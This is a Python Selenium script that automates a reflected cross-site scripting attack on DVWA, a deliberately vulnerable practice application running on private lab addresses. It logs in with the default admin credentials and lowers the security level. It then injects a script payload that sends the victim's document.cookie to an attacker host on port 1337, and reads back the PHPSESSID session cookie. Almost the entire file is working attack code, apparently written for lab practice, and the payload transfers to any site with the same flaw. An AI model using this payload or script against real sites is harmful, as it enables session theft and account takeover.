"""
This script automates an XSS attack against the DVWA vulnerable web application using Selenium WebDriver. It logs in, sets the security level to low, injects an XSS payload, and simulates victim access to extract the session cookie.
For security testing and simulation purposes only.
"""
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys

DVWA_IP = "192.168.56.101"
ATTACKER_IP = "192.168.56.102"
ATTACKER_PORT = 1337

LOGIN_URL = f"http://{DVWA_IP}/dvwa/login.php"
SECURITY_URL = f"http://{DVWA_IP}/dvwa/security.php"
XSS_URL = f"http://{DVWA_IP}/dvwa/vulnerabilities/xss_r/"

options = Options()
options.binary_location = "/usr/bin/chromium"
chromedriver_path = "/usr/bin/chromedriver"
service = Service(chromedriver_path)
driver = webdriver.Chrome(service=service, options=options)

try:
    print("[*] Logging in to DVWA...")
    driver.get(LOGIN_URL)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))
    driver.find_element(By.NAME, "username").send_keys("admin")
    driver.find_element(By.NAME, "password").send_keys("password")
    token = driver.find_element(By.NAME, "user_token").get_attribute("value")
    driver.find_element(By.NAME, "Login").click()
    if "Login failed" in driver.page_source:
        print("[-] Login failed.")
        driver.quit()
        exit()
    print("[+] Successfully logged in!")

    print("[*] Setting security level to low...")
    driver.get(SECURITY_URL)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "security")))
    driver.find_element(By.NAME, "security").send_keys("low")
    driver.find_element(By.NAME, "seclev_submit").click()
    print("[+] Security level set to low.")

    print("[*] Injecting XSS payload...")
    xss_payload = f"<script>new Image().src='http://{ATTACKER_IP}:{ATTACKER_PORT}/?c='+document.cookie;</script>"
    driver.get(XSS_URL)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "name")))
    input_field = driver.find_element(By.NAME, "name")
    input_field.send_keys(xss_payload + Keys.RETURN)
    time.sleep(1)

    victim_url = f"{XSS_URL}?name={xss_payload}"
    print(f"[+] Simulating victim access: {victim_url}")
    driver.get(victim_url)
    time.sleep(1)

    print("[*] Extracting session cookie from browser...")
    session_cookie = driver.get_cookie("PHPSESSID")
    if session_cookie:
        print(f"[+] PHPSESSID: {session_cookie['value']}")
    else:
        print("[-] Session cookie not found.")
except Exception as e:
    print(f"[-] Error: {e}")
finally:
    driver.quit()
